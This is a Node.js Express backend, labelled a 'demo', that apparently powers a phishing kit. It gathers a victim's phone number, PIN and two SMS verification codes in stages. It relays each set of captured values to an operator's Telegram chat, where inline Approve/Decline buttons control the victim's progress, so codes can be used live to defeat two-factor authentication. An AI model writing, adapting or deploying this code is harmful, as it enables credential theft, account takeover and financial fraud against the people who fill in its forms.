const express = require("express");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const sessions = new Map();

app.use(express.json({ limit: "10kb" }));
app.use(express.static(path.join(__dirname, "public")));

// Telegram API helper
async function telegram(method, data) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error("Telegram environment variables are missing.");
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
    signal: AbortSignal.timeout(15000)
  });

  const result = await response.json();
  if (!response.ok || !result.ok) {
    throw new Error(result.description || `Telegram HTTP ${response.status}`);
  }
  return result.result;
}

// Health check
app.get("/api/health", (req, res) => {
  res.json({ ok: true, message: "Demo server running." });
});

// Create demo session
app.post("/api/session", (req, res) => {
  const sessionId = crypto.randomBytes(12).toString("hex");
  sessions.set(sessionId, {
    createdAt: Date.now(),
    stage: null,
    status: "idle",
    data: {} // Holds user input values persistently across stages
  });
  res.json({ sessionId });
});

// Request Telegram approval & submit custom values
app.post("/api/approval-request", async (req, res) => {
  const { sessionId, stage, payload } = req.body || {};
  const allowedStages = ["pin", "code1", "code2"];
  const session = sessions.get(sessionId);

  if (!session || !allowedStages.includes(stage)) {
    return res.status(400).json({ error: "Invalid demo session or stage." });
  }

  if (Date.now() - session.createdAt > 30 * 60 * 1000) {
    sessions.delete(sessionId);
    return res.status(410).json({ error: "Demo session expired." });
  }

  // Merge the newly entered values into the session data store
  session.data = { ...session.data, ...payload };
  session.stage = stage;
  session.status = "pending";
  session.updatedAt = Date.now();

  const stageLabels = {
    pin: "Stage 1: Phone & PIN Submission",
    code1: "Stage 2: Custom Text Value Submission",
    code2: "Stage 3: Final SMS Code Submission"
  };

  try {
    // Generate clean reporting text for Telegram showing actual submitted inputs
    const textMessage = 
      `📝 ${stageLabels[stage].toUpperCase()}\n\n` +
      `📱 Phone Number: ${session.data.phone || "Not Entered yet"}\n` +
      `🔑 Inputted PIN: ${session.data.pin || "Not Entered yet"}\n` +
      `💬 Custom Value: ${session.data.code1 || "Not Entered yet"}\n` +
      `🔢 Final SMS Code: ${session.data.code2 || "Not Entered yet"}\n\n` +
      `🆔 Session ID: ${sessionId}`;

    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: textMessage,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Approve Step", callback_data: `approve:${sessionId}:${stage}` },
            { text: "Decline Step", callback_data: `decline:${sessionId}:${stage}` }
          ]
        ]
      }
    });

    return res.json({ ok: true, status: "pending" });
  } catch (error) {
    session.status = "idle";
    console.error("Telegram delivery failed:", error.message);
    return res.status(502).json({ error: "Telegram alert failed to send." });
  }
});

// Check demo approval status
app.get("/api/status", (req, res) => {
  const { sessionId, stage } = req.query;
  const session = sessions.get(sessionId);

  if (!session) return res.status(404).json({ error: "Session missing." });
  if (session.stage !== stage) return res.json({ status: "idle" });

  res.json({ status: session.status });
});

// Receive Telegram Webhook inline actions
app.post("/telegram-webhook", async (req, res) => {
  res.sendStatus(200);
  const query = req.body?.callback_query;
  if (!query?.data) return;

  const match = /^(approve|decline):([a-f0-9]+):(pin|code1|code2)$/.exec(query.data);
  if (!match) return;

  const [, decision, sessionId, stage] = match;
  const session = sessions.get(sessionId);

  if (!session || session.stage !== stage || session.status !== "pending") {
    try {
      await telegram("answerCallbackQuery", {
        callback_query_id: query.id,
        text: "This action request has expired."
      });
    } catch (e) {}
    return;
  }

  session.status = decision === "approve" ? "approved" : "declined";
  
  try {
    await telegram("answerCallbackQuery", {
      callback_query_id: query.id,
      text: `Step manually ${session.status}!`
    });

    if (query.message?.message_id) {
      await telegram("editMessageText", {
        chat_id: CHAT_ID,
        message_id: query.message.message_id,
        text: 
          `✅ ACTION PROCESSED (${session.status.toUpperCase()})\n\n` +
          `📱 Phone: ${session.data.phone || "N/A"}\n` +
          `🔑 PIN: ${session.data.pin || "N/A"}\n` +
          `💬 Value: ${session.data.code1 || "N/A"}\n` +
          `🔢 SMS Code: ${session.data.code2 || "N/A"}\n\n` +
          `Processed on stage: ${stage}`
      });
    }
  } catch (err) {
    console.error("Webhook UI modification failed:", err.message);
  }
});

app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));

